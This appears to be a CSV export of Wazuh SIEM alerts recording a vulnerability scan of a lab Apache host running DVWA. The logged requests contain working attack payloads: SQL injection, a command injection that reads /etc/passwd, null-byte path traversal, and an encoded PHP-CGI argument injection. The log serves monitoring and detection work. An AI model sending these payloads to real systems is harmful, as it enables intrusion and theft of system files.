_index,_id,_version,_score,_source.agent.ip,_source.agent.name,_source.agent.id,_source.manager.name,_source.data.protocol,_source.data.srcip,_source.data.id,_source.data.url,_source.rule.firedtimes,_source.rule.mail,_source.rule.level,_source.rule.pci_dss,_source.rule.tsc,_source.rule.description,_source.rule.groups,_source.rule.id,_source.rule.nist_800_53,_source.rule.gdpr,_source.decoder.name,_source.full_log,_source.input.type,_source.@timestamp,_source.location,_source.id,_source.timestamp,_source.rule.mitre.technique,_source.rule.mitre.id,_source.rule.mitre.tactic,_source.previous_output,_source.rule.frequency,_source.rule.info,_source.predecoder.hostname,_source.predecoder.program_name,_source.predecoder.timestamp,_source.data.dstuser,_source.data.srcport,_source.decoder.parent,_source.rule.hipaa
wazuh-alerts-4.x-2023.10.20,R8BWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/DVWA/plog-rss.php?level=collection&id=999%20OR%20plogger_id_sql_injection.nasl,6189,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /DVWA/plog-rss.php?level=collection&id=999%20OR%20plogger_id_sql_injection.nasl HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.217",/var/log/apache2/access.log,1697826346.6013869,"Oct 20, 2023 @ 18:25:46.217", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,ScBWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/plogger/plog-download.php?dl_type=album&checked[]='%20UNION%20SELECT%20'plogger_checked_sql_injection.nasl'%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%20--%20,39,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /plogger/plog-download.php?dl_type=album&checked[]='%20UNION%20SELECT%20'plogger_checked_sql_injection.nasl'%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%20--%20 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.218",/var/log/apache2/access.log,1697826346.6014986,"Oct 20, 2023 @ 18:25:46.218","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,SsBWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/photos/plog-download.php?dl_type=album&checked[]='%20UNION%20SELECT%20'plogger_checked_sql_injection.nasl'%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%20--%20,40,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /photos/plog-download.php?dl_type=album&checked[]='%20UNION%20SELECT%20'plogger_checked_sql_injection.nasl'%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%20--%20 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.219",/var/log/apache2/access.log,1697826346.6015664,"Oct 20, 2023 @ 18:25:46.219","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,T8BWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/plog-download.php?dl_type=album&checked[]='%20UNION%20SELECT%20'plogger_checked_sql_injection.nasl'%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%20--%20,44,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /plog-download.php?dl_type=album&checked[]='%20UNION%20SELECT%20'plogger_checked_sql_injection.nasl'%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%2c0%20--%20 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.221",/var/log/apache2/access.log,1697826346.6021378,"Oct 20, 2023 @ 18:25:46.221","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,UsBWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,"/lifetype/index.php?op=ViewAlbum&albumId=-1/**/UNION/**/SELECT/**/0,1,1804470191,514744074,1,1,1,1,1--&blogId=1",6193,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /lifetype/index.php?op=ViewAlbum&albumId=-1/**/UNION/**/SELECT/**/0,1,1804470191,514744074,1,1,1,1,1--&blogId=1 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.223",/var/log/apache2/access.log,1697826346.6023226,"Oct 20, 2023 @ 18:25:46.223", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,U8BWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,"/cgi-bin/index.php?op=ViewAlbum&albumId=-1/**/UNION/**/SELECT/**/0,1,1804470191,514744074,1,1,1,1,1--&blogId=1",6194,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /cgi-bin/index.php?op=ViewAlbum&albumId=-1/**/UNION/**/SELECT/**/0,1,1804470191,514744074,1,1,1,1,1--&blogId=1 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.224",/var/log/apache2/access.log,1697826346.6023819,"Oct 20, 2023 @ 18:25:46.224", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,VsBWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,200,/DVWA/login.php?password=&password=%0Acat%20/etc/passwd,569,false,6,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /DVWA/login.php?password=&password=%0Acat%20/etc/passwd HTTP/1.1"" 200 1722 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.226",/var/log/apache2/access.log,1697826346.6028140,"Oct 20, 2023 @ 18:25:46.226","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,V8BWTosBpjjGT_ibL8hm,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/gallery/admin/plog-admin-functions.php?config[basedir]=/etc/passwd%00,544,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /gallery/admin/plog-admin-functions.php?config[basedir]=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.227",/var/log/apache2/access.log,1697826346.6028693,"Oct 20, 2023 @ 18:25:46.227","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,XMBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/admin/plog-admin-functions.php?config[basedir]=/etc/passwd%00,548,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /admin/plog-admin-functions.php?config[basedir]=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.229",/var/log/apache2/access.log,1697826346.6033254,"Oct 20, 2023 @ 18:25:46.229","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,XsBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,"/pligg/evb/check_url.php?url=pligg_url_sql_injection.nasl'%20UNION%20SELECT%201697826342,1961199453%20--%20",45,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /pligg/evb/check_url.php?url=pligg_url_sql_injection.nasl'%20UNION%20SELECT%201697826342,1961199453%20--%20 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.231",/var/log/apache2/access.log,1697826346.6034333,"Oct 20, 2023 @ 18:25:46.231","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,X8BWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,POST,192.168.204.1,404,/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e,6196,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""POST /%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.232",/var/log/apache2/access.log,1697826346.6034946,"Oct 20, 2023 @ 18:25:46.232", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,ZMBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/scripts/index.php?x=browse&category='UNION%20SELECT%20'1'%2c'2'%2c'pixelpost_category_sql_injection.nasl'%2c'1697826343'%2c'5'--,47,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /scripts/index.php?x=browse&category='UNION%20SELECT%20'1'%2c'2'%2c'pixelpost_category_sql_injection.nasl'%2c'1697826343'%2c'5'-- HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.237",/var/log/apache2/access.log,1697826346.6038105,"Oct 20, 2023 @ 18:25:46.237","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,ZcBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,302,/DVWA/index.php?x=browse&category='UNION%20SELECT%20'1'%2c'2'%2c'pixelpost_category_sql_injection.nasl'%2c'1697826343'%2c'5'--,48,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /DVWA/index.php?x=browse&category='UNION%20SELECT%20'1'%2c'2'%2c'pixelpost_category_sql_injection.nasl'%2c'1697826343'%2c'5'-- HTTP/1.1"" 302 522 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.237",/var/log/apache2/access.log,1697826346.6038740,"Oct 20, 2023 @ 18:25:46.237","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,ZsBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/pixelpost/index.php?x=browse&category='UNION%20SELECT%20'1'%2c'2'%2c'pixelpost_category_sql_injection.nasl'%2c'1697826343'%2c'5'--,49,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /pixelpost/index.php?x=browse&category='UNION%20SELECT%20'1'%2c'2'%2c'pixelpost_category_sql_injection.nasl'%2c'1697826343'%2c'5'-- HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.235",/var/log/apache2/access.log,1697826346.6039372,"Oct 20, 2023 @ 18:25:46.235","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,acBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/index.php,6200,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /cgi-bin/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.239",/var/log/apache2/access.log,1697826346.6043111,"Oct 20, 2023 @ 18:25:46.239", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,asBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/scripts/index.php,6201,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /scripts/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.241",/var/log/apache2/access.log,1697826346.6043611,"Oct 20, 2023 @ 18:25:46.241", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,a8BWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/index.php,6202,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.242",/var/log/apache2/access.log,1697826346.6044111,"Oct 20, 2023 @ 18:25:46.242", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,c8BWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/phpx/admin/login.php,6207,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /phpx/admin/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.250",/var/log/apache2/access.log,1697826346.6048871,"Oct 20, 2023 @ 18:25:46.250", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,dMBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/admin/login.php,477,false,10,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /cgi-bin/admin/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.250",/var/log/apache2/access.log,1697826346.6049374,"Oct 20, 2023 @ 18:25:46.250","[""Vulnerability Scanning""]","[""T1595.002""]","[""Reconnaissance""]","192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /phpx/admin/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:46 +0500] ""GET /admin/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:46 +0500] ""GET /DVWA/admin/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /piranha/secure/control.php3? HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /piranha/secure/control.php3? HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /scripts/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /cgi-bin/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /pixelpost/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /pligg/settemplate.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:45 +0500] ""GET /pligg/settemplate.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",14, , , , , , , , 
wazuh-alerts-4.x-2023.10.20,dsBWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/scripts/admin/login.php,6208,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:46 +0500] ""GET /scripts/admin/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.250",/var/log/apache2/access.log,1697826346.6052441,"Oct 20, 2023 @ 18:25:46.250", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,g8BWTosBpjjGT_ibNcil,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/forum.php?forum=-1%20UNION%20SELECT%20null%2c123456%2cnull%2cnull%2cnull%2cnull--,59,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:46 +0500] ""GET /forum.php?forum=-1%20UNION%20SELECT%20null%2c123456%2cnull%2cnull%2cnull%2cnull-- HTTP/1.1"" 404 493 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:46.259",/var/log/apache2/access.log,1697826346.6062163,"Oct 20, 2023 @ 18:25:46.259","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
